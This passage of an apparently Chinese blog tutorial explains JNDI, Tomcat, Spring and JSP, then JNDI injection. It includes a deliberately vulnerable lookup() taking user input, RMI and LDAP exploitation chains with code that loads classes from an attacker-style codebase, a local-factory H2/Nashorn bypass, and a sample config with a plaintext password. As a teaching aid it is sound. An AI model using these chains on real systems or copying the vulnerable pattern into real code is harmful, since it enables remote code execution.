+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="nt">&lt;driver-class&gt;</span>com.mysql.cj.jdbc.Driver<span class="nt">&lt;/driver-class&gt;</span> 
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="nt">&lt;user-name&gt;</span>leyi<span class="nt">&lt;/user-name&gt;</span> 
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="nt">&lt;password&gt;</span>061018<span class="nt">&lt;/password&gt;</span> 
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nt">&lt;/local-tx-datasource&gt;</span> 
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nt">&lt;/datasources&gt;</span>
+</span></span></code></pre></div>
+<h4 id="在代码中通过-jndi-引用" data-numberify>在代码中通过 JNDI 引用<a class="anchor ms-1" href="#在代码中通过-jndi-引用"></a></h4>
+<p>容器启动后，这段配置就生效了。此时，你的 Java 代码只需要通过 JNDI 接口去“按名索物”即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w">    </span><span class="c1">// 1. 创建 JNDI 上下文</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w">    </span><span class="n">Context</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w">    </span><span class="c1">// 2. 通过名字查找数据源（这个 MySqlDS 就是刚才 XML 里配的）</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">datasourceRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;java:MySqlDS&#34;</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">    </span><span class="c1">// 3. 获取数据源并拿到连接</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">    </span><span class="n">DataSource</span><span class="w"> </span><span class="n">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DataSource</span><span class="p">)</span><span class="w"> </span><span class="n">datasourceRef</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ds</span><span class="p">.</span><span class="na">getConnection</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">    </span><span class="c1">// 使用 conn 进行数据库 SQL 操作</span><span class="w">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">conn</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"> 
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">            </span><span class="n">conn</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w"> 
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="n">SQLException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> 
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"> 
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>现在的代码彻底不用管具体 JDBC 参数了。如果哪天数据库换了机器、改了密码，甚至从 MySQL 换成了 Oracle，你只需要去修改容器的 XML 配置文件即可，只要保证数据源名称（<code>MySqlDS</code>）不变，Java 源代码一行都不用改，重新编译都不需要。</p>
+<p>由此可见，JNDI 避免了程序与数据库之间的紧耦合，让应用变得易于配置和部署。这就是 JNDI 在 J2EE 架构中最大的价值。</p>
+<blockquote>
+<p>“这段文字里的 JNDI 用法，带有很浓厚的传统 Java EE 色彩。现在你如果去用 Spring Boot 开发，基本看不到这种写法了。Spring Boot 用 <code>application.yml</code> 配置数据源，再用依赖注入（<code>@Autowired</code>）直接把 <code>DataSource</code> 塞进你的代码里。</p>
+<p>但底层发生了什么呢？ Spring Boot 在背后帮你自动配置了连接池（如 HikariCP）。在某些特定的传统企业容器里，Spring 甚至依然会通过 JNDI 去获取服务器配置好的数据源。所以，依赖注入本质上是把 JNDI 的主动查找变成了被动接收，JNDI 并没有消失，只是退到了幕后。”</p>
+</blockquote>
+
+<h2 id="web服务与框架" data-numberify>Web服务与框架<a class="anchor ms-1" href="#web服务与框架"></a></h2>
+<p>那么嗦到这里，再看看 Spring 和 Spring Boot，Tomcat都是些什么东西吧（真是梦到哪说到哪）</p>
+
+<h3 id="tomcat-是-servlet-容器" data-numberify>Tomcat 是 Servlet 容器<a class="anchor ms-1" href="#tomcat-是-servlet-容器"></a></h3>
+<p>Tomcat 的核心工作是实现 Servlet 容器规范，它本质是一个 Web 服务器。</p>
+<p>这里的服务器并不是我们平时说的一台物理机、云主机；而是软件层面的服务器，比如Nginx、Apache等。</p>
+<p>更确切地说，Tomcat 是一个 Servlet 容器。</p>
+<p>Servlet 是 Java Web 世界里一个基础性规范，全称 Server Applet，即小服务程序。在 C/C++ 中，服务器能返回的通常是预先写好的静态文件。Servlet 的出现，就是为了动态网页的实现，其根据每一次请求的不同返回动态内容。</p>
+<p>Servlet 是一个接口（Interface），它主要定义了三个事情：</p>
+<ul>
+<li><strong>初始化 (<code>init</code>)</strong>：容器创建 Servlet 实例，并调用一次 <code>init</code> 方法进行准备工作。通常只在第一次请求到达或容器启动时发生。</li>
+<li><strong>服务 (<code>service</code>)</strong>：这是核心环节。容器调用 <code>service</code> 方法，并将代表请求的 <code>HttpServletRequest</code> 对象和代表响应的 <code>HttpServletResponse</code> 对象传递进来。你的业务逻辑就在这里编写——从请求中读取数据，处理，然后把结果写入响应。</li>
+<li><strong>销毁 (<code>destroy</code>)</strong>：当 Web 应用被关闭或容器决定回收资源时，会调用 <code>destroy</code> 方法，让你有机会释放占用的资源。</li>
+</ul>
+<p>但是 Servlet类（实现该接口的类）本身没有 main 方法，不能独立启动，也不能直接监听端口、解析 HTTP。它必须<strong>部署到 Tomcat 中</strong>，由 Tomcat 创建它的实例、调用它的方法、最后销毁它。也就是说，Servlet 是“被容纳”在 Tomcat 里的组件，所以 Tomcat 是它的容器。Tomcat 负责管理 Servlet 组件的生命周期并提供运行环境。</p>
+<p>那么这些 Web 服务器 都做些什么呢？</p>
+<ul>
+<li><strong>Web 服务器和 Servlet 容器负责</strong>：网络通信（Socket）、HTTP 协议解析、多线程处理、把请求打包成 <code>HttpServletRequest</code> 对象，把响应打包成 <code>HttpServletResponse</code> 对象。</li>
+<li><strong>不管什么</strong>：它完全不管你业务逻辑怎么写，也不管你怎么连数据库。</li>
+</ul>
+
+<h3 id="spring-是企业级应用框架" data-numberify>Spring 是企业级应用框架<a class="anchor ms-1" href="#spring-是企业级应用框架"></a></h3>
+<p>Spring 的核心是 IoC（Inversion of Control，控制反转）容器。它的思想是：把对象的创建、依赖关系的组装和生命周期管理，从应用代码手里“反转”交给一个外部容器来负责。</p>
+<p>如果说 Tomcat 管的是“请求怎么进来、怎么变成 <code>HttpServletRequest</code>”，那么 Spring 管的是“请求进来之后，业务对象怎么组织、依赖怎么组装、事务怎么控制”。</p>
+<p>它管理项目中大量 Java 对象（Bean）的创建、组装和生命周期，并在此基础上提供事务、安全、面向切面编程（AOP）、数据访问（如 Spring Data）等企业级能力。</p>
+<p>所以，IoC 容器是 Spring 的地基，但 Spring 并不止于 IoC。它作为企业级应用框架，还在 IoC 之上提供了 AOP、事务管理、数据访问封装、Spring MVC 等能力。同时，<strong>它不直接处理 Socket 和 HTTP 解析，而是运行在 Servlet 容器之上，专注于应用层的组织与治理。</strong></p>
+<p>Tomcat 和 Spring 的关系，有点像 Python 里 Gunicorn 和 Flask 的关系，可以粗略对应：</p>
+<ul>
+<li><strong>Flask ≈ Spring（应用框架）</strong>：负责定义路由（URL 到处理逻辑的映射）、处理业务逻辑、操作数据库、渲染模板等。它们不直接处理底层 TCP 连接和 HTTP 报文解析。</li>
+<li><strong>Gunicorn ≈ Tomcat（Web 服务器 / 容器）</strong>：负责监听端口、接收网络请求、管理并发，然后把请求转交给背后的应用。Gunicorn 主要用多进程模型，Tomcat 主要用多线程模型，并且 Tomcat 还是 Servlet 容器，负责管理 Servlet 组件的生命周期。</li>
+</ul>
+<p>所以更准确地说：<strong>Gunicorn 和 Tomcat 都处在“服务器/运行环境”这一层，Flask 和 Spring 都处在“应用框架”这一层。</strong> 这个类比适合理解层次关系，但不宜完全画等号。</p>
+
+<h3 id="spring-mvc衔接二者" data-numberify>Spring MVC：衔接二者<a class="anchor ms-1" href="#spring-mvc衔接二者"></a></h3>
+<p>但这里还有一个问题：Tomcat 把请求打包成 <code>HttpServletRequest</code> 之后，怎么交给 Spring 的业务代码？答案是 <strong>Spring MVC</strong>。</p>
+<p>Spring MVC 的核心是一个叫 <code>DispatcherServlet</code> 的类。注意，<strong>它本身就是一个 Servlet</strong>——它间接实现了 <code>Servlet</code> 接口，因此会被部署在 Tomcat 这个 Servlet 容器里。Tomcat 并不认识你的 <code>Controller</code>，它只认识 Servlet；于是请求先到 <code>DispatcherServlet</code>，再由它根据 URL 路由到你写的 <code>Controller</code> 方法。</p>
+<p>所以请求链路是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">浏览器
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  → Tomcat（解析 HTTP，创建请求/响应对象）
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  → DispatcherServlet（一个 Servlet，由 Tomcat 调用）
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  → Controller → Service → DAO
+</span></span></code></pre></div><p>换句话说，<strong>Spring MVC 不是替代 Tomcat，而是寄生在 Servlet 容器之上的框架</strong>：Tomcat 负责“把请求交给 Servlet”，Spring MVC 负责“拿到请求后怎么分发给你的 Controller”。</p>
+<p>严格说，Flask 更接近 <strong>Spring MVC</strong>，而不是整个 Spring。Spring 是一个框架家族，IoC 容器、AOP、事务、数据访问、Spring MVC 都是它的组成部分；Spring MVC 只是其中负责 Web 层的那一块。所以前面的类比应理解为：Flask ≈ Spring MVC 的 Web 框架角色。</p>
+
+<h3 id="spring-boot整合层不是新的一层" data-numberify>Spring Boot：整合层，不是新的一层<a class="anchor ms-1" href="#spring-boot整合层不是新的一层"></a></h3>
+<p>Spring Boot 不是又一个“层”，而是<strong>整合与运行时封装</strong>。传统开发要手动装 Tomcat、配 <code>web.xml</code>、配 Spring 容器；Spring Boot 把 Tomcat 内嵌进来，通过自动配置和 starter 把 Spring、Spring MVC、数据访问等组件打包成一个可直接 <code>main</code> 启动的应用。</p>
+<p>它让服务器和应用看起来合为一体，但底层仍然是：<strong>内嵌 Tomcat 提供 Servlet 容器，Spring MVC 的 <code>DispatcherServlet</code> 接收请求，IoC 容器管理 Bean。</strong></p>
+
+<h3 id="jsp-本质上是-servlet" data-numberify>JSP 本质上是 Servlet<a class="anchor ms-1" href="#jsp-本质上是-servlet"></a></h3>
+<p>JSP 的全称是 JavaServer Pages，看起来像在 HTML 里写 Java 代码，但它能被容器执行，是因为它在运行时被转换成的类是一个间接实现了 Servlet 接口的类。</p>
+<p>当你第一次请求一个 <code>.jsp</code> 文件时，Tomcat 并不会直接执行它。容器中有一个专门的 <strong>JSP 引擎</strong>，它会先检查这个 JSP 页面对应的 Servlet 是否比 JSP 文件本身旧。（如果生成的 Servlet 比 JSP 文件旧，说明 JSP 在上次编译之后又被改过，原来的 Servlet 已经过期，需要重新生成。）如果是，就把 JSP <strong>翻译</strong>成一个 Java 源文件，再<strong>编译</strong>成 <code>.class</code> 字节码，最后加载执行。</p>
+<p>翻译出来的类，本质上就是一个 Servlet。这个类通常叫 <code>xxx_jsp</code>，它继承了某个 Servlet 基类（如 <code>HttpJspBase</code>），并实现了 <code>Servlet</code> 接口体系。你写在 JSP 里的内容，在翻译阶段会被分类处理：</p>
+<ul>
+<li><strong>静态 HTML</strong>：被转成“向响应输出流写入这段文本”的代码；</li>
+<li><strong>Scriptlet（<code>&lt;% %&gt;</code>）</strong> ：Java 代码片段被插入生成的 Servlet 类中；</li>
+<li><strong>表达式（<code>&lt;%= %&gt;</code>）</strong> ：被转成向响应写入表达式求值结果的代码；</li>
+<li><strong>声明（<code>&lt;%! %&gt;</code>）</strong> ：变量和方法声明被插入类级别。</li>
+</ul>
+<p>所以你写的 JSP，最终就是一个用另一种语法写出来的 Servlet</p>
+<p>JSP 里的 request、response 从哪来？</p>
+<p>因为最终执行的是 Servlet，容器在调用 <code>_jspService()</code> 时自然持有 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code> 对象。JSP 规范为了让开发者不用手动声明，就把这些对象预先定义成了“内置对象”，可以直接在 JSP 里使用：<code>request</code>、<code>response</code>、<code>session</code>、<code>application</code>、<code>out</code> 等。它们不是 JSP 自己创建的东西，而是 <strong>Servlet API 中本来就有、由容器传入的请求/响应/会话/ServletContext 对象</strong>，只是被 JSP 引擎提前绑定成了变量名。</p>
+<p>但是 JSP 在主流开发中已经退场了，它退居二线，主要是存在于一些老服务中。</p>
+<p>它本身是允许在 HTML 里直接写 Java 代码，这在大项目中会很难维护。而且其严重依赖传统的 Servlet 容器和 <code>web.xml</code> 配置，在Spring Boot 为主流的今天，它需要额外复杂的配置才能使用。JSP 文件无法被浏览器直接打开预览，前端开发者必须依赖后端环境才能看到页面效果。因此，无论是Spring 官方推荐的 Thymeleaf，还是彻底走向前后端分离（由 Vue / React 负责视图），现代技术栈都已将 JSP 排除在新项目的选项之外。</p>
+<p>但是大量老系统依然依赖 JSP 工作（好吧我们网安的土壤很大一部分都是老系统），也许你可以在一些题目里见到 JSP 上传，其实有点类似于 PHP 的图片马。</p>
+
+<h2 id="安全方面" data-numberify>安全方面<a class="anchor ms-1" href="#安全方面"></a></h2>
+
+<h3 id="jndi注入" data-numberify>JNDI注入<a class="anchor ms-1" href="#jndi注入"></a></h3>
+
+<h4 id="从按名取物到按名加载代码" data-numberify>从“按名取物”到“按名加载代码”<a class="anchor ms-1" href="#从按名取物到按名加载代码"></a></h4>
+<p>前文 JNDI 的正常用法是：名字由容器预先配好，代码只是按名去取，比如 <code>ctx.lookup(&quot;java:MySqlDS&quot;)</code>。<strong>JNDI 注入的前提，就是这个 <code>lookup()</code> 的参数从 可信配置 变成了 外部可控输入 。</strong></p>
+<p>一个典型的脆弱写法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;uri&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 攻击者可控</span><span class="w">
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="w"></span><span class="n">InitialContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="w"></span><span class="n">ctx</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">uri</span><span class="p">);</span><span class="w"> </span><span class="c1">// 名字完全由外部决定</span><span class="w">
+</span></span></span></code></pre></div><p>InitialContext 是 JNDI 的入口，代表初始目录环境。<code>lookup(name)</code> 就是拿着名字去查找资源。漏洞的起点就是这里的 <code>uri</code> 可控。</p>
+<p>一旦攻击者能控制 <code>lookup()</code> 的参数，他就可以传入一个指向自己服务器的 RMI 或 LDAP URL。JNDI 会按这个 URL 去远程“查找”资源，而远程服务可以返回一个 <code>Reference</code> 对象，里面携带 <code>classFactory</code> 和 <code>classFactoryLocation</code>，告诉客户端：“你要的类不在本地，去这个地址下载。”客户端如果本地找不到这个类，就会从攻击者指定的地址拉取 <code>.class</code> 字节码并<strong>实例化</strong>——构造方法或静态代码块随之执行，RCE 就发生了。</p>
+<p>JNDI 不只是“查对象”，在遇到 <code>Reference</code> 且本地缺类时，它还会<strong>下载并实例化</strong>对象。</p>
+
+<h4 id="工厂-和-reference对象-是什么" data-numberify>工厂 和 Reference对象 是什么<a class="anchor ms-1" href="#工厂-和-reference对象-是什么"></a></h4>
+<p>你看到一说到 JNDI 就会提到工厂，这个工厂是什么鬼东西？Reference对象又是什么？</p>
+<p>在 JNDI 的正常设计中，Reference 是一种用于引用外部对象的机制。当你 lookup 一个名字的时候，服务端不一定直接返回一个真实对象，可以返回一个 Reference，告诉客户端：我这里没有你要的对象，你去这个地址找吧</p>
+<p>一个 Reference对象 主要包含三个信息：</p>
+<ul>
+<li><code>className</code>：被引用对象的类名；</li>
+<li><code>classFactory</code>：负责创建对象的工厂类名，通常实现 <code>ObjectFactory</code>；</li>
+<li><code>classFactoryLocation</code>：工厂类字节码所在的远程 URL，通常是 HTTP 地址。</li>
+</ul>
+<p>于是，当受害者连接到攻击者的恶意 RMI 或 LDAP 服务器时，服务端不返回正常对象，而是返回一个精心构造的 Reference对象，告诉受害者说：&ldquo;你去这个地方找吧！&quot;，于是受害者就去链接攻击者的另一台 HTTP服务器。然后它就下载了对应的 <code>.class</code> 文件并实例化，最终导致 RCE。</p>
+<blockquote>
+<p>当然，现代 JDK 默认关闭了 <code>trustURLCodebase</code>，所以这种远程加载工厂类的方式在高版本 JDK 中默认已经不可用。</p>
+</blockquote>
+<p>在 JNDI 中，Reference对象 本身并不是你最终要拿到的资源，而像是一个说明书，那么由谁来把这个说明书所描绘的真实对象构造出来呢？这就是工厂的工作。</p>
+<p>JDK 中定义了一个标准的接口 <code>javax.naming.spi.ObjectFactory</code>，里面只有一个核心方法：<code>getObjectInstance()</code>。</p>
+<p>JNDI 客户端拿到 <code>Reference</code> 后，会看看说明书上有没有写指定哪个加工厂（即 <code>javaFactory</code> 属性）。如果有，就去把这个加工厂实例化，然后把 <code>Reference</code> 里的参数丢给它的 <code>getObjectInstance()</code> 方法，让它根据参数生产出最终的对象。</p>
+<p><strong>在正常的开发中：</strong>
+如果程序员用 JNDI 查一个数据源，容器返回一个 <code>Reference</code>，指定了 <code>BasicDataSourceFactory</code>。JNDI 就会叫这个工厂去读取数据库的账号密码，然后返回一个货真价实的数据库连接池对象。</p>
+<p><strong>在 JNDI 注入中，工厂成了攻击的跳板：</strong>
+因为不同工厂的“警惕性”不一样：</p>
+<ul>
+<li>比如 Tomcat 的 <code>BeanFactory</code> 很警惕，它只接受自家特制的 <code>ResourceRef</code> 订单，普通订单直接拒收（返回 null）；</li>
+<li>但像 <code>BasicDataSourceFactory</code> 这类第三方库的工厂，警惕性很低，只要看到是个 <code>Reference</code> 就接单，老老实实地去读取说明书里的参数（比如 JDBC URL）。</li>
+</ul>
+<p>攻击者就是利用了这种<strong>低警惕性的工厂</strong>。在 LDAP 返回的恶意条目里，强行指定一个目标本地存在的、有危险行为的工厂类。当 JNDI 去调用这个工厂“生产对象”时，实际上就是借这把合法的刀，执行了攻击者预设的危险逻辑（比如建立恶意的 H2 数据库连接）。</p>
+
+<h4 id="三种协议三种角色" data-numberify>三种协议，三种角色<a class="anchor ms-1" href="#三种协议三种角色"></a></h4>
+<p>我们重点讨论 LDAP、RMI、DNS 三种协议，它们在这个攻击面里的角色并不相同：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">协议</th>
+          <th style="text-align: left">在 JNDI 注入中的角色</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>RMI</strong></td>
+          <td style="text-align: left">远程方法调用协议。攻击者起一个 RMI Registry，把恶意 <code>Reference</code> 绑定上去，客户端 <code>lookup()</code> 时取回并实例化。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>LDAP</strong></td>
+          <td style="text-align: left">轻量级目录访问协议。攻击者起一个 LDAP 服务，在查询结果里返回带有 <code>javaCodeBase</code>、<code>javaFactory</code>、<code>objectClass=javaNamingReference</code> 的条目，诱导客户端加载远程类。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>DNS</strong></td>
+          <td style="text-align: left">只做<strong>探测</strong>。<code>lookup(&quot;dns://xxx.dnslog.cn&quot;)</code> 能让目标发起 DNS 查询，证明“参数可控、JNDI 可达”，但 DNS 本身不返回 <code>Reference</code>，不能直接 RCE。</td>
+      </tr>
+  </tbody>
+</table>
+<p>DNS 探测的价值在于低成本验证漏洞存在，同时避免过早暴露 RMI/LDAP 服务器 IP。先 DNSLog 确认，再上 RMI/LDAP 利用，是实战里更稳妥的顺序。</p>
+<p>JNDI 注入的可利用性高度依赖 JDK 版本：</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">协议</th>
+          <th style="text-align: left">JDK 6</th>
+          <th style="text-align: left">JDK 7</th>
+          <th style="text-align: left">JDK 8</th>
+          <th style="text-align: left">JDK 11</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>LDAP</strong></td>
+          <td style="text-align: left">6u211 以下</td>
+          <td style="text-align: left">7u201 以下</td>
+          <td style="text-align: left">8u191 以下</td>
+          <td style="text-align: left">11.0.1 以下</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>RMI</strong></td>
+          <td style="text-align: left">6u132 以下</td>
+          <td style="text-align: left">7u122 以下</td>
+          <td style="text-align: left">8u113 以下</td>
+          <td style="text-align: left">无</td>
+      </tr>
+  </tbody>
+</table>
+<p>Oracle 逐步收紧了 <code>Reference</code> 的远程 codebase 加载：RMI 方向大约从 8u121 开始限制，LDAP 方向大约从 6u211 / 7u201 / 8u191 / 11.0.1 开始默认关闭 <code>trustURLCodebase</code>。所以在较新 JDK 上，LDAP 返回 Reference 指向远程 HTTP 这条最直接的路径默认走不通，攻击面会转向本地 classpath 中已有的 gadget 类、反序列化等路径。JNDI 注入并没有消失，只是利用条件变苛刻了</p>
+
+<h4 id="rmi-利用链条" data-numberify>RMI 利用链条<a class="anchor ms-1" href="#rmi-利用链条"></a></h4>
+<p>RMI 方向的复现逻辑很清晰：</p>
+<ol>
+<li>攻击者起一个 RMI Registry；</li>
+<li>构造一个 <code>Reference(&quot;Calculator&quot;, &quot;Calculator&quot;, &quot;http://攻击者:8081/&quot;)</code>；</li>
+<li>用 <code>ReferenceWrapper</code> 包装后绑定到 Registry 的某个名字上；</li>
+<li>受害端 <code>lookup(&quot;rmi://攻击者:7778/RCE&quot;)</code>；</li>
+<li>客户端取回 <code>Reference</code>，本地找不到 <code>Calculator</code> 类，就去 <code>http://攻击者:8081/</code> 下载 <code>Calculator.class</code> 并实例化；</li>
+<li><code>Calculator</code> 的构造方法里执行命令。</li>
+</ol>
+<p>核心代码大致是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">Reference</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;Calculator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Calculator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:8081/&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="w"></span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">reference</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="w"></span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;RCE&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">wrapper</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>受害端只有一行关键代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">().</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://127.0.0.1:7778/RCE&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div>
+<h4 id="ldap-利用链条" data-numberify>LDAP 利用链条<a class="anchor ms-1" href="#ldap-利用链条"></a></h4>
+<p>LDAP 方向的服务端要稍微复杂一些。攻击者通常会使用 <code>unboundid-ldapsdk</code> 这类库起一个内存 LDAP 服务。当受害者的 JNDI 客户端发起 <code>lookup(&quot;ldap://攻击者:1234/Calculator&quot;)</code> 时，LDAP 服务会在查询结果里返回一个特殊条目，包含以下核心属性：</p>
+<ul>
+<li><code>javaClassName</code>：目标类名；</li>
+<li><code>javaCodeBase</code>：远程类所在的 HTTP 地址；</li>
+<li><code>javaFactory</code>：工厂类名；</li>
+<li><code>objectClass</code>：<code>javaNamingReference</code>。</li>
+</ul>
+<p>客户端 JNDI 收到这个条目后，会将其解析为一个 <code>Reference</code> 对象。在最经典的利用方式中，客户端如果发现本地没有这个类，就会根据 <code>javaCodeBase</code> 属性，去攻击者的 HTTP 服务器上下载恶意 <code>.class</code> 文件并实例化，从而完成 RCE。</p>
+<p>和 RMI 的区别在于：RMI 是把 <code>Reference</code> 对象直接绑定在 Registry 里；而 LDAP 是把 <code>Reference</code> 所需的信息，编码成目录条目的属性返回。 两者最终都汇入了“客户端通过 <code>Reference</code> 加载并实例化类”这一条路径。</p>
+<p>但是，现代 JDK 拦住了这条路。
+高版本 JDK（如 8u191+、JDK 11+）默认将 <code>trustURLCodebase</code> 设为 <code>false</code>，拒绝根据 <code>javaCodeBase</code> 远程加载类。如果你还用这种“一把梭”的远程下载思路去打，目标会直接报错。</p>
+<p>那么我们该怎样去注入呢？那就是利用本地工厂（Local Factory）</p>
+<p>既然不让从远程下载类，我们能不能让 <code>Reference</code> 去加载目标本地已存在的类？
+这就是现代 JNDI 利用的核心：<strong>利用 <code>javaFactory</code> 属性，指向目标 classpath 里现成的、带有危险行为的工厂类。</strong></p>
+<p>比如，如果目标系统里依赖了 <code>commons-dbcp2</code> 和 <code>h2</code> 数据库驱动。攻击者就可以在 LDAP 返回的条目中这样配置：</p>
+<ul>
+<li><code>javaFactory</code>：设为 <code>org.apache.commons.dbcp2.BasicDataSourceFactory</code>；</li>
+<li>并附加一系列自定义属性，例如指定 URL 为 <code>jdbc:h2:mem:x:INIT=...</code>。</li>
+</ul>
+<p>客户端 JNDI 解析后，不去远程下载，而是直接实例化本地的 <code>BasicDataSourceFactory</code>，并把附加属性当成数据库连接参数传进去。最终通过 H2 的 <code>INIT</code> 参数和 Nashorn 脚本引擎，在目标本地执行任意命令。</p>
+<p>在这种新模式下，<code>Reference</code> 不再是远程下载清单，而是让目标调用本地的工厂——告诉目标 JNDI：“请用你本地的这个工厂，按我给的参数去构造对象。”</p>
+
+<h3 id="java-原生反序列化" data-numberify>Java 原生反序列化<a class="anchor ms-1" href="#java-原生反序列化"></a></h3>
